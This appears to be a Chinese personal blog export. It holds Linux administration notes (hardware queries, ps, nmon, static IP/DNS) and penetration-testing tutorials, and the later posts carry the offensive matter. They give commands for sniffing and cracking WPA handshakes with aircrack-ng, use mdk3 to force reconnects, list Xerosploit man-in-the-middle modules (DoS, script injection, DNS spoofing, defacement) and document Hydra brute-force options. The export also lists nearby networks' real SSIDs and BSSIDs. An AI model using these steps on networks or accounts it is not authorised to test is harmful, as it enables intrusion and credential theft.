查看所有网络接口的属性iptables -L # 查看防火墙设置 route -n # 查看路由表 netstat -lntp # 查看所有监听端口 netstat -antp # 查看所有已经建立的连接netstat -s # 查看网络统计信息 进程 12ps -ef # 查看所有进程 top # 实时显示进程状态 用户 123456w # 查看活动用户 id &lt;用户名&gt; # 查看指定用户信息 last # 查看用户登录日志 cut -d: -f1 /etc/passwd # 查看系统所有用户 cut -d: -f1 /etc/group # 查看系统所有组 crontab -l # 查看当前用户的计划任务 服务 12chkconfig --list # 列出所有系统服务 chkconfig --list | grep on # 列出所有启动的系统服务 程序 1rpm -qa # 查看所有安装的软件包 常用命令整理如下： 1234567891011121314151617181920212223242526272829303132333435363738394041查看主板的序列号: dmidecode | grep -i ’serial number’用硬件检测程序kuduz探测新硬件：service kudzu start ( or restart)查看CPU信息：cat /proc/cpuinfo [dmesg | grep -i &apos;cpu&apos;][dmidecode -t processor]查看内存信息：cat /proc/meminfo [free -m][vmstat]查看板卡信息：cat /proc/pci查看显卡/声卡信息：lspci |grep -i ‘VGA’[dmesg | grep -i &apos;VGA&apos;]查看网卡信息：dmesg | grep -i ‘eth’[cat /etc/sysconfig/hwconf | grep -i eth][lspci | grep -i &apos;eth&apos;]查看PCI信息：lspci (相比cat /proc/pci更直观）查看USB设备：cat /proc/bus/usb/devices查看键盘和鼠标:cat /proc/bus/input/devices查看系统硬盘信息和使用情况：fdisk &amp; disk – l &amp; df查看各设备的中断请求(IRQ):cat /proc/interrupts查看系统体系结构：uname -a查看及启动系统的32位或64位内核模式：isalist –v [isainfo –v][isainfo –b]dmidecode查看硬件信息，包括bios、cpu、内存等信息测定当前的显示器刷新频率：/usr/sbin/ffbconfig –rev \\?查看系统配置：/usr/platform/sun4u/sbin/prtdiag –v查看当前系统中已经应用的补丁：showrev –p显示当前的运行级别：who –rH查看当前的bind版本信息：nslookup –class=chaos –q=txt version.binddmesg | more 查看硬件信息lspci 显示外设信息, 如usb，网卡等信息lsnod 查看已加载的驱动lshwpsrinfo -v 查看当前处理器的类型和速度（主频）prtconf -v 打印当前的OBP版本号iostat –E 查看硬盘物理信息(vendor, RPM, Capacity)prtvtoc /dev/rdsk/c0t0d0s 查看磁盘的几何参数和分区信息df –F ufs –o i 显示已经使用和未使用的i-node数目isalist –v对于“/proc”中文件可使用文件查看命令浏览其内容，文件中包含系统特定信息：Cpuinfo 主机CPU信息Dma 主机DMA通道信息Filesystems 文件系统信息Interrupts 主机中断信息Ioprots 主机I/O端口号信息Meninfo 主机内存信息Version Linux内存版本信息 备注： proc – process information pseudo-filesystem 进程信息伪装文件系统 lspcilspci - list all PCI devices ，主要是有来列出机器中的PCI 设备，比如声卡、显卡、猫、网卡等，主板集成设备也能列出来；lspci 是读取 hwdata 数据库，hwdata 由软件包 hwdata 提供；大约有如下文件 12345678910111213141516[beinan@localhost ~]# rpm -ql hwdata-0.158-1/etc/hotplug/blacklist /etc/pcmcia /etc/pcmcia/config /usr/X11R6/lib/X11/Cards /usr/share/doc/hwdata-0.158 /usr/share/doc/hwdata-0.158/COPYING /usr/share/doc/hwdata-0.158/LICENSE /usr/share/hwdata /usr/share/hwdata/CardMonitorCombos /usr/share/hwdata/Cards /usr/share/hwdata/MonitorsDB /usr/share/hwdata/pci.ids /usr/share/hwdata/pcitable /usr/share/hwdata/upgradelist /usr/share/hwdata/usb.ids 查看设备是否正常 cat /proc/devices 是否加载某个设备 lsmod 查看是否存在驱动 cat /proc/pcan 即是设备映射 ls /dev/ 查看设备节点 通过查看/proc 目录的相应文件获取一些硬件信息我们在查看 /etc/fstab 时，会注意到这样一行； /dev/proc /proc proc defaults 0 0 12345proc 看起来象是一个文件系统，其实他并不是一个真正的文件系统 ， 它是“proc - process information pseudo-filesystem”，译成中文大概的意思是“进程信息伪装文件系统”呵呵，这是我翻译的，有可能不对，请多多指正； “The proc filesystem is a pseudo-filesystem which is used as an interface to kernel data structures. It is commonly mounted at /proc. Most of it is read-only, but some files allow kernel variables to be changed.” 我再来乱译一下然后再根据/proc 的内容自己理解理解。proc 文件系统做为内核kernel 数据结构的接口，把kernel 的一些信息（比如硬件信息，包括CPU 、网卡、显示卡、内存、文件系统、SCSI 设备 ....）写到 proc 文件系统中，proc被mont 到 /proc 目录；/proc 目录中有大数据大多文件是只读的，但一些数据是根据内核的变化而变化的；/proc 目录中的数据是经常变动的，对于系统中的每个进程都有一个PID；都可以在/proc 中找到；我们也可以通过 ps -aux |more 来查看进程； 我们可以通过 cat 命令来读取/proc 目录下的文件，比如cpu的信息； [root@localhost beinan]# cat /proc/cpuinfo 详细的内容还得需要您来慢慢查看；对于 /proc 的了解也是有必要的； dmesgdmesg 是一个显示内核缓冲区系统控制信息的工具；比如系统在启动时的信息会写到/var/log/ 注：dmesg 工具并不是专门用来查看硬件芯片组标识的工具，但通过这个工具能让我们知道机器中的硬件的一些参数；因为系统在启动的时候，会写一些硬件相关的日志到 /var/log/message 或 /var/log/boot 文件中； 如果我们用这个工具来查看一些硬件的信息；这个工具信息量太大，的确需要耐心； [root@localhost beinan]# dmesg [root@localhost beinan]# dmesg -c 注：清理掉缓冲区，下次开机的时候还会自动生成； 硬件驱动是由内核支持的，但驱动都存放在哪里？硬件驱动是必须由内核支持的，无论是我们自己安装驱动，还是内核自带的驱动都是如此。硬件驱动如果是以内核模块支持的，驱动目录位于： /lib/modules/内核版本/kernel/目录 或 /lib/modules/内核版本/kernel/drivers 目录中； [root@localhost beinan]# uname -r 2.6.11-1.1369_FC4 [root@localhost beinan]# ls /lib/modules/2.6.11-1.1369_FC4/kernel arch crypto drivers fs lib net sound 注：只有驱动在内核中以模块的方法支持的，或者我们自己安装的驱动，驱动才位于 /lib/modules/相应的目录；如果是直接置入内核的，不会出现在/lib/modules驱动相关的目录；","categories":[{"name":"Linux环境","slug":"Linux环境","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/Linux环境/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"}]},{"title":"ps","slug":"commands/Linux-ps","date":"2017-10-11T12:12:51.000Z","updated":"2018-12-05T13:57:11.779Z","comments":true,"path":"2017/10/11/commands/Linux-ps/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/10/11/commands/Linux-ps/","excerpt":"Linux中的ps命令是Process Status的缩写。ps命令用来列出系统中当前运行的那些进程。ps命令列出的是当前那些进程的快照，就是执行ps命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用htop/top命令。 ps命令支持三种使用的语法格式: UNIX 风格，选项可以组合在一起，并且选项前必须有“-”连字符 BSD 风格，选项可以组合在一起，但是选项前不能有“-”连字符 GNU 风格的长选项，选项前有两个“-”连字符","text":"Linux中的ps命令是Process Status的缩写。ps命令用来列出系统中当前运行的那些进程。ps命令列出的是当前那些进程的快照，就是执行ps命令的那个时刻的那些进程，如果想要动态的显示进程信息，就可以使用htop/top命令。 ps命令支持三种使用的语法格式: UNIX 风格，选项可以组合在一起，并且选项前必须有“-”连字符 BSD 风格，选项可以组合在一起，但是选项前不能有“-”连字符 GNU 风格的长选项，选项前有两个“-”连字符 linux上进程有5种状态: 运行(正在运行或在运行队列中等待) 中断(休眠中, 受阻, 在等待某个条件的形成或接受到信号) 不可中断(收到信号不唤醒和不可运行, 进程必须等待直到有中断发生) 僵死(进程已终止, 但进程描述符存在, 直到父进程调用wait4()系统调用后释放) 停止(进程收到SIGSTOP, SIGTSTP, SIGTTIN, SIGTTOU信号后停止运行运行) ps工具标识进程的5种状态码: D 不可中断 uninterruptible sleep (usually IO) R 运行 runnable (on run queue) S 中断 sleeping T 停止 traced or stopped Z 僵死 a defunct (”zombie”) process 命令参数 a 显示所有进程 -a 显示同一终端下的所有程序 -A 显示所有进程 c 显示进程的真实名称 -N 反向选择 -e 等于“-A” e 显示环境变量 f 显示程序间的关系 -H 显示树状结构 r 显示当前终端的进程 T 显示当前终端的所有程序 u 指定用户的所有进程 -au 显示较详细的资讯 -aux 显示所有包含其他使用者的行程 -C&lt;命令&gt; 列出指定命令的状况 –lines&lt;行数&gt; 每页显示的行数 –width&lt;字符数&gt; 每页显示的字符数 –help 显示帮助信息 –version 显示版本显示 -o: OBSOLETE SORT KEYS​ These keys are used by the BSD O option (when it is used for sorting). The GNU –sort option doesn’t use these keys, but the specifiers described below in the STANDARD FORMAT SPECIFIERS section. Note that the values used in sorting are the internal​ values ps uses and not the “cooked” values used in some of the output format fields (e.g. sorting on tty will sort into device number, not according to the terminal name displayed). Pipe ps output into the sort(1) command if you want to sort the cooked​ values. 123456789101112131415161718192021222324252627KEY LONG DESCRIPTION c cmd simple name of executable C pcpu cpu utilization f flags flags as in long format F field g pgrp process group ID G tpgid controlling tty process group ID j cutime cumulative user time J cstime cumulative system time k utime user time m min_flt number of minor page faults M maj_flt number of major page faults n cmin_flt cumulative minor page faults N cmaj_flt cumulative major page faults o session session ID p pid process ID P ppid parent process ID r rss resident set size R resident resident pages s size memory size in kilobytes S share amount of shared pages t tty the device number of the controlling tty T start_time time process was started U uid user ID number u user user name v vsize total VM size in KiB y priority kernel scheduling priority AIX FORMAT DESCRIPTORS​ This ps supports AIX format descriptors, which work somewhat like the formatting codes of printf(1) and printf(3). For example, the normal default output can be produced with this: ps -eo “%p %y %x %c”. The NORMAL codes are described in the next section. 12345678910111213141516CODE NORMAL HEADER%C pcpu %CPU%G group GROUP%P ppid PPID%U user USER%a args COMMAND%c comm COMMAND%g rgroup RGROUP%n nice NI%p pid PID%r pgid PGID%t etime ELAPSED%u ruser RUSER%x time TIME%y tty TTY%z vsz VSZ 输出列的含义 F 代表这个程序的旗标 (flag)， 4 代表使用者为 super user UID 程序被该 UID 所拥有 PID 进程的ID PPID 则是其上级父程序的ID PRI 这个是 Priority (优先执行序) 的缩写，详细后面介绍 NI 这个是 Nice 值，在下一小节我们会持续介绍 ADDR 这个是 kernel function，指出该程序在内存的那个部分。如果是个 running的程序，一般就是 “-“ WCHAN 目前这个程序是否正在运作当中，若为 - 表示正在运作 USER：该 process 属于那个使用者账号的 %CPU：该 process 使用掉的 CPU 资源百分比 %MEM：该 process 所占用的物理内存百分比 VSZ ：该 process 使用掉的虚拟内存量 (Kbytes) RSS ：该 process 占用的固定的内存量 (Kbytes) TTY ：该 process 是在那个终端机上面运作，若与终端机无关，则显示 ?，另外， tty1-tty6 是本机上面的登入者程序，若为 pts/0 等等的，则表示为由网络连接进主机的程序。 STAT：该程序目前的状态，主要的状态有 R ：该程序目前正在运作，或者是可被运作 S ：该程序目前正在睡眠当中 (可说是 idle 状态)，但可被某些讯号 (signal) 唤醒。 T ：该程序目前正在侦测或者是停止了 Z ：该程序应该已经终止，但是其父程序却无法正常的终止他，造成 zombie (疆尸) 程序的状态 START：该 process 被触发启动的时间 TIME ：该 process 实际使用 CPU 运作的时间 COMMAND：该程序的实际指令 12ps -ef | grep postgreps aux | grep postgre 参考IBM-ps","categories":[{"name":"命令篇","slug":"命令篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/"},{"name":"性能监控","slug":"命令篇/性能监控","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/性能监控/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"性能监控","slug":"性能监控","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/性能监控/"}]},{"title":"nmon","slug":"commands/Linux-nmon","date":"2017-10-10T12:06:09.000Z","updated":"2018-12-05T13:56:43.920Z","comments":true,"path":"2017/10/10/commands/Linux-nmon/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/10/10/commands/Linux-nmon/","excerpt":"以交互方式显示本地系统统计信息并以记录方式记录系统统计信息。 基本命令: q : 停止并退出 Nmon h : 查看帮助 c : 查看 CPU 统计数据 m : 查看内存统计数据 d : 查看硬盘统计数据 k : 查看内核统计数据 n : 查看网络统计数据 N : 查看 NFS 统计数据 j : 查看文件系统统计数据 t : 查看高耗进程 V : 查看虚拟内存统计数据 v : 详细模式","text":"以交互方式显示本地系统统计信息并以记录方式记录系统统计信息。 基本命令: q : 停止并退出 Nmon h : 查看帮助 c : 查看 CPU 统计数据 m : 查看内存统计数据 d : 查看硬盘统计数据 k : 查看内核统计数据 n : 查看网络统计数据 N : 查看 NFS 统计数据 j : 查看文件系统统计数据 t : 查看高耗进程 V : 查看虚拟内存统计数据 v : 详细模式 命令详细 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104Hint: nmon.sh [-h] [-s &lt;seconds&gt;] [-c &lt;count&gt;] [-f -d &lt;disks&gt; -t -r &lt;name&gt;] [-x] -h 查看完整的说明信息，有两种模式：a、命令行交互式模式 (h) b、对于数据收集模式 (-f) -f 电子表格的输出格式 [注意：默认 -s300 -c288] 可选 (300秒*288次=86400秒=60*60*24=1天) -s &lt;seconds&gt; 刷新屏幕频率的时间 [默认 2] -c &lt;number&gt; 刷新屏幕的次数 [默认 1000000] -d &lt;disks&gt; to increase the number of disks [default 256] -t spreadsheet includes top processes -x capacity planning (每15分钟1天 = -fdt -s 900 -c 96)版本 - nmon 14g对于命令行交互式模式 -s &lt;seconds&gt; 刷新屏幕频率的时间 [默认 2] -c &lt;number&gt; 刷新屏幕的次数 [默认 1000000] -g &lt;filename&gt; User Defined Disk Groups [hit g to show them] - file = on each line: group_name &lt;disks list&gt; space separated - like: database sdb sdc sdd sde - upto 64 disk groups, 512 disks per line - disks can appear more than once and in many groups -b 命令行交互模式的界面是黑色和白色 [默认的颜色] 例如: nmon.sh -s 1 -c 100 (说明：在命令行交互模式下，每秒钟刷新一次屏幕，总共采集100次) 对于数据收集模式 = 电子表格格式 （逗号分隔值） Note: use only one of f,F,z,x or X and make it the first argument -f 电子表格输出格式 [注意: default -s300 -c288] 输出文件是 &lt;hostname&gt;_YYYYMMDD_HHMM.nmon -F &lt;filename&gt; 等同于 -f 但是使用用户提供的文件名 -r &lt;runname&gt; 用于电子表格文件 [default hostname] -t include top processes in the output -T as -t plus saves command line arguments in UARG section -s &lt;seconds&gt; 采集数据的时间 -c &lt;number&gt; 采集数据的次数 -d &lt;disks&gt; to increase the number of disks [default 256] -l &lt;dpl&gt; disks/line default 150 to avoid spreadsheet issues. EMC=64. -g &lt;filename&gt; User Defined Disk Groups (see above) - see BBBG &amp; DG lines -N include NFS Network File System -I &lt;percent&gt; Include process &amp; disks busy threshold (default 0.1) don't save or show proc/disk using less than this percent -m &lt;directory&gt; 生成的数据文件的路径 例如：在30秒的时间间隔收集的top procs，持续1小时 nmon.sh -f -t -r Test1 -s30 -c120 To load into a spreadsheet: sort -A *nmon &gt;stats.csv transfer the stats.csv file to your PC Start spreadsheet &amp; then Open type=comma-separated-value ASCII file The nmon analyser or consolidator does not need the file sorted. Capacity planning mode - use cron to run each day -x sensible spreadsheet output for CP = one day 每15分钟1天 ( i.e. -ft -s 900 -c 96) -X sensible spreadsheet output for CP = busy hour 每30秒1小时 ( i.e. -ft -s 30 -c 120) 交互模式命令 key --- Toggles to control what is displayed --- h = 联机帮助信息 r = 机器类型，机器名，缓存信息和OS版本+LPAR c = CPU处理器统计条形图 l = 条形图长期CPU（超过75个快照） m = 内存统计 L = 巨大的内存页面统计 V = 虚拟内存和交换统计 k = 内核内部统计 n = 网络统计和错误 N = NFS网络文件系统 d = 磁盘I/O图 D = 磁盘I/O统计 o = 磁盘I/O映射（每个磁盘上的一个字符显示它是多么繁忙） j = 文件系统 t = 顶级进程统计使用1,3,4,5来选择数据及顺序 u = 顶级进程命令的详细信息 v = 详细简单的检查 - OK/Warn(警告)/Danger(危险) b = 黑白模式（或使用- b选项） . = 最小模式，即只显示繁忙的磁盘和进程 key --- Other Controls --- + = 双屏幕刷新时间 - = 一半的屏幕刷新时间 q = 退出 (also x, e or control-C) 0 = 零峰计数复位 (峰值 = \"&gt;\") space = 立即刷新屏幕 Startup Control If you find you always type the same toggles every time you start then place them in the NMON shell variable. For example: export NMON=cmdrvtan Others: a) To you want to stop nmon - kill -USR2 &lt;nmon-pid&gt; b) Use -p and nmon outputs the background process pid c) To limit the processes nmon lists (online and to a file) Either set NMONCMD0 to NMONCMD63 to the program names or use -C cmd:cmd:cmd etc. example: -C ksh:vi:syncd d) If you want to pipe nmon output to other commands use a FIFO: mkfifo /tmp/mypipe nmon -F /tmp/mypipe &amp; grep /tmp/mypipe e) If nmon fails please report it with: 1) nmon version like: 14g 2) the output of cat /proc/cpuinfo 3) some clue of what you were doing 4) I may ask you to run the debug version Developer Nigel Griffiths Feedback welcome - on the current release only and state exactly the problem No warranty given or implied. 参考IBM-nmon","categories":[{"name":"命令篇","slug":"命令篇","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/"},{"name":"性能监控","slug":"命令篇/性能监控","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/categories/命令篇/性能监控/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"},{"name":"Commands","slug":"Commands","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Commands/"},{"name":"性能监控","slug":"性能监控","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/性能监控/"}]},{"title":"修改固定Ip 与DNS","slug":"yunwei/修改固定Ip-与DNS","date":"2017-09-27T07:55:45.000Z","updated":"2018-03-27T12:07:38.686Z","comments":false,"path":"2017/09/27/yunwei/修改固定Ip-与DNS/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/27/yunwei/修改固定Ip-与DNS/","excerpt":"Ubuntu / Centos 静态ip DNS","text":"Ubuntu / Centos 静态ip DNS 修改静态ip ubuntu 编辑文件 /etc/network/interface 123456789# interfaces(5) file used by ifup(8) and ifdown(8)#auto lo#iface lo inet loopbackauto eth0iface eth0 inet static address 192.168.2.250gateway 192.168.2.1netmask 255.255.255.0 CentOS 编辑 /etc/sysconfig/network-scripts/ifcfg-eth0 12345678910111213141516171819202122TYPE=EthernetBOOTPROTO=noneDEFROUTE=yesIPV4_FAILURE_FATAL=noIPV6INIT=yesIPV6_AUTOCONF=yesIPV6_DEFROUTE=yesIPV6_FAILURE_FATAL=noIPV6_ADDR_GEN_MODE=stable-privacyNAME=eth0UUID=407367ac-fe2a-4b92-8d73-40d4e44a6e3bDEVICE=eth0ONBOOT=yesDNS1=8.8.8.8IPADDR=192.168.2.254PREFIX=24GATEWAY=192.168.2.1DNS2=114.114.114.114IPV6_PEERDNS=yesIPV6_PEERROUTES=yesIPV6_PRIVACY=noZONE=public ​ 修改DNS 域名: vi /etc/resolv.conf ubuntu 与 CentOS 配置相同 # Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8) # DO NOT EDIT THIS FILE BY HAND – YOUR CHANGES WILL BE OVERWRITTEN nameserver 8.8.8.8 nameserver 114.114.114.114 重启网络或者重启网卡 1service networking status ## restart 或 12ifconfig eth0 down // up 启动;ifconfig eth0 up","categories":[],"tags":[{"name":"Linux","slug":"Linux","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Linux/"}]},{"title":"MacBook 破解Wifi","slug":"kali/MacBook-破解Wifi","date":"2017-09-23T11:24:26.000Z","updated":"2018-11-19T16:06:00.118Z","comments":false,"path":"2017/09/23/kali/MacBook-破解Wifi/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/23/kali/MacBook-破解Wifi/","excerpt":"个人使用MacBook Pro系统破解本人wifi, 仅供学习研究专用","text":"个人使用MacBook Pro系统破解本人wifi, 仅供学习研究专用 MacBook 版本信息: 安装aircrack-ngMac ports 下载 使用Mac Book 自带wifi工具: 查看周围Wifi信息: 1234/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s ## 查看周围wifi可在.bashrc / .zshrc 中设置 alias airport=&apos;/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport&apos; 1234567891011121314151617#&gt; airport -s SSID BSSID RSSI CHANNEL HT CC SECURITY (auth/unicast/group) Xiaomi_5273 64:09:80:13:52:74 -82 11 Y CN WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP) Rexel-SSC 3c:8c:40:fd:67:c2 -76 48 Y NO WPA2(PSK/AES/AES) Rexel-Guest 3c:8c:40:fd:67:c1 -76 48 Y NO WPA2(PSK/AES/AES) rabbithouse d4:ee:07:0a:a8:d8 -80 6,-1 Y CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) Rexel-SSC 3c:8c:40:fd:67:d2 -49 1 Y NO WPA2(PSK/AES/AES) Rexel-Guest 3c:8c:40:fd:67:d1 -48 1 Y NO WPA2(PSK/AES/AES) MERCURY_7DA8 e4:f3:f5:c6:7d:a8 -74 1,+1 Y CN WPA(PSK/AES/AES) WPA2(PSK/AES/AES) jovision 46:d9:e7:91:14:96 -88 11 Y -- WPA2(PSK/AES,TKIP/TKIP) D-Link_DIR-600M 34:08:04:7d:07:98 -73 11 Y -- NONE Xiaomi_F4C8 cc:2d:21:b1:91:81 -90 10,-1 Y -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) zsguopeng c8:3a:35:11:95:60 -77 9,-1 Y -- WPA(PSK/AES/AES) Unimation 8a:25:93:aa:54:c5 -37 9,-1 Y -- WPA(PSK/AES,TKIP/TKIP) WPA2(PSK/AES,TKIP/TKIP) TP-LINK_4EE6 80:89:17:8b:4e:e6 -72 6,-1 Y -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES) DIRECT-FE-HP b0:5a:da:34:22:c6 -86 6 Y -- WPA2(PSK/AES/AES) ​ 捕获无线网络数据握手包 12airport en0 sniff 11 ## 11 是指监测wifi 的信号 channel airport -s 中查看## 生成的抓包数据 自动存储到 /tmp/airport***.cap ​ 破解WIFI密码: airport可以使用网卡的监听模式抓取周围的无线网络数据包。其中，对我们最重要的数据包是：包含密码的包－也叫握手包。当有新用户或断开用户自动连接wifi时，会发送握手包。有一种攻击方式是reinjecting packet，它可以强制无线路由器重启，这样当用户自动连接时可以获得握手包。 mdk3 进行路由器攻击, 下载 1234sudo aircrack-ng -w crackstion-human-only-简.txt -b 8a:25:93:aa:54:c5 /tmp/airportSniffcmYNuz.cap ## -b 具体查看airport -s 中的ssid## -w 具体密码字典文件 Error :错误： ​ Opening /tmp/airportSniffWtYJtf.cap​ No valid WPA handshakes found.. 是因为airport sniff 监听时，并未有用户断开或者链接wifi - 若是自己测试可以使用手机进行wifi链接，或断开，进行测试 WIFI: SSID ​ Service Set IDentifier ​ SSID就是手机上搜索到的wifi名字（本质是一串字符） BSSID ​ Basic Service Set IDentifier ​ BSSID就是无线路由器的MAC地址（本质是一个MAC地址） ESSID ​ Extended Service Set IDentifier ​ ESSID是一个比较抽象的概念，它实际上就和ssid相同（本质也是一串字符） RSSI Received Signal Strength Indication接收的信号强度指示，无线发送层的可选部分，用来判定链接质量，以及是否增大广播发送强度。 CHANNEL WIFI 信道 密码机制:​ 弱密码 ​ 手机号 ​ 姓名生日 ​ 节假日 ​ 各大网站泄露密码 ​ ​ 暴力无奈之举: Crunch工具","categories":[],"tags":[{"name":"Mac","slug":"Mac","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Mac/"},{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"内网渗透:Xerosploit","slug":"kali/内网渗透-xerosploit","date":"2017-09-20T10:07:58.000Z","updated":"2018-11-19T16:06:30.128Z","comments":true,"path":"2017/09/20/kali/内网渗透-xerosploit/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/20/kali/内网渗透-xerosploit/","excerpt":"Xerosploit是一款可以进行中间人攻击的渗透测试工具包。它具有多种模块，可以进行多重有效的攻击，如拒绝服务和端口扫描、劫持等。 由bettercap和nmap强力驱动。","text":"Xerosploit是一款可以进行中间人攻击的渗透测试工具包。它具有多种模块，可以进行多重有效的攻击，如拒绝服务和端口扫描、劫持等。 由bettercap和nmap强力驱动。 安装xerosploit 12345git clone https://github.com/LionSec/xerosploitcd xerosploit &amp;&amp; sudo python install.pysudo xerosploit 异常问题 pcaprub.c:11:18: fatal error: pcap.h: No such file or directory #include &lt;xpcap.h&gt; compilation terminated. Makefile:239: recipe for target ‘pcaprub.o’ failed make: * [pcaprub.o] Error 1 解决: sudo gem install packetfu -v 1.1.11 &amp;&amp; apt-get install libpcap-dev ​ root@kailvirtual:~/xerosploit# xerosploit Traceback (most recent call last): File “/opt/xerosploit/xerosploit.py”, line 26, in ​ from terminaltables import DoubleTable ImportError: No module named terminaltables​ root@kailvirtual:~/xerosploit# xerosploitTraceback (most recent call last): File “/opt/xerosploit/xerosploit.py”, line 27, in ​ from tabulate import tabulate ImportError: No module named tabulate 解决: pip install terminaltables &amp;&amp; pip install.py tabulate 启动并应用: 启动 help 功能 进行扫描网络 选择目标 - 并查看帮助 12345678910111213141516171819202122232425pscan：端口扫描dos：对目标进行dos攻击ping：对目标进行ping是否存活injecthtml：将html注入到目标访问的网站中injectjs：将javascript注入到目标访问的网站中rdownload：替换目标下载的文件sniff：嗅探目标的流量信息dspoof：将所有http流量重定向到特定ipyplay：在目标的浏览器中后台播放youtube视频（还得fq）replace：替换目标访问网站的所有图片driftnet：查看目标访问网站的所有图片move：让目标访问网站变得抖动deface：将目标访问网站的所有页面替换成自己定义的html代码 ​​","categories":[],"tags":[{"name":"渗透","slug":"渗透","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/渗透/"},{"name":"Kali","slug":"Kali","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/tags/Kali/"}]},{"title":"HyDra 暴力破解 以及字典生成工具","slug":"kali/HyDra","date":"2017-09-19T03:47:41.000Z","updated":"2018-11-19T16:05:51.006Z","comments":false,"path":"2017/09/19/kali/HyDra/","link":"","permalink":"http://rocky_ansi.gitee.io/vagabond1132_blog/2017/09/19/kali/HyDra/","excerpt":"Hydra 简介:​ hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。官网，可支持AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP等类型密码。","text":"Hydra 简介:​ hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。官网，可支持AFP, Cisco AAA, Cisco auth, Cisco enable, CVS, Firebird, FTP, HTTP-FORM-GET, HTTP-FORM-POST, HTTP-GET, HTTP-HEAD, HTTP-PROXY, HTTPS-FORM-GET, HTTPS-FORM-POST, HTTPS-GET, HTTPS-HEAD, HTTP-Proxy, ICQ, IMAP, IRC, LDAP, MS-SQL, MYSQL, NCP, NNTP, Oracle Listener, Oracle SID, Oracle, PC-Anywhere, PCNFS, POP3, POSTGRES, RDP, Rexec, Rlogin, Rsh, SAP/R3, SIP, SMB, SMTP, SMTP Enum, SNMP, SOCKS5, SSH (v1 and v2), Subversion, Teamspeak (TS2), Telnet, VMware-Auth, VNC and XMPP等类型密码。 参数说明:hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE|-x OPT -y]] | [-C FILE]] [-e nsr] [-u] [-f|-F] [-M FILE] [-o FILE] [-b FORMAT] [-t TASKS] [-T TASKS] [-w TIME] [-W TIME] [-m OPTIONS] [-s PORT] [-c TIME] [-S] [-O] [-4|6] [-I] [-vV] [-d] server service [OPTIONS] -R restore a previously aborted session. Requires a hydra.restore file was written. Options are restored, but can be changed by setting them after -R on the command line 继续从上一次进度接着破解。 -S connect via SSL 采用SSL链接。 -O use old SSL v2 and v3 -s PORT if the service is on a different default port, define it here PORT 可通过这个参数指定非默认端口 -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE LOGIN 指定破解的用户，对特定用户破解。 -p PASS or -P FILE try password PASS, or load several passwords from FILE 指定特定密码 -x min:max:charset generate passwords from min to max length. charset can contain 1 for numbers, a for lowcase and A for upcase characters. Any other character is added is put to the list. Example: 1:2:a1%. The generated passwords will be of length 1 to 2 and contain lowcase letters, numbers and/or percent signs and dots. -y disable use of symbols in -x bruteforce, see above -e nsr additional checks, &quot;n&quot; for null password, &quot;s&quot; try login as pass, &quot;r&quot; try the reverse login as pass -e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探 -C FILE colon separated &quot;login:pass&quot; format, instead of -L/-P options FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数 -u by default Hydra checks all passwords for one login and then tries the next login. This option loops around the pass- words, so the first password is tried on all logins, then the next password. -f exit after the first found login/password pair (per host if -M) 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解 -F exit after the first found 